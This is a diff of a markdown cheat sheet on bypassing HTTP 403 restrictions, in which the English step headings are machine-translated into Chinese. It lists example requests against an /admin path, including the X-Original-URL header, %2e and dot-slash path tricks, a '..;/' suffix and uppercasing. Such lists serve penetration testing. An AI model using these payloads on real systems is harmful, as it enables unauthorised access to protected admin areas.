@@ -1,6 +1,6 @@
 # 403 Forbidden Bypass
 
-1. Using "X-Original-URL" header
+1. 使用“ X-Original-URL”标题 header
 ```
 GET /admin HTTP/1.1
 Host: target.com
@@ -12,7 +12,7 @@ Host: target.com
 X-Original-URL: /admin
 ```
 
-2. Appending **%2e** after the first slash
+2. 在第一个斜杠后附加％2e
 ```
 http://target.com/admin => 403
 ```
@@ -21,7 +21,7 @@ Try this to bypass
 http://target.com/%2e/admin => 200
 ```
 
-3. Try add dot (.) and slash (/) in the URL
+3. 尝试在网址中添加点（。）和斜杠（/）
 ```
 http://target.com/admin => 403
 ```
@@ -32,7 +32,7 @@ http://target.com//admin// => 200
 http://target.com/./admin/./ => 200
 ```
 
-4. Add "..;/" after the directory name
+4. 在目录名称后添加“ ..; /”
 ```
 http://target.com/admin
 ```
@@ -42,7 +42,7 @@ http://target.com/admin..;/
 ```
 
 
-5. Try to uppercase the alphabet in the url
+5. 尝试将网址中的字母大写
 ```
 http://target.com/admin
 ```
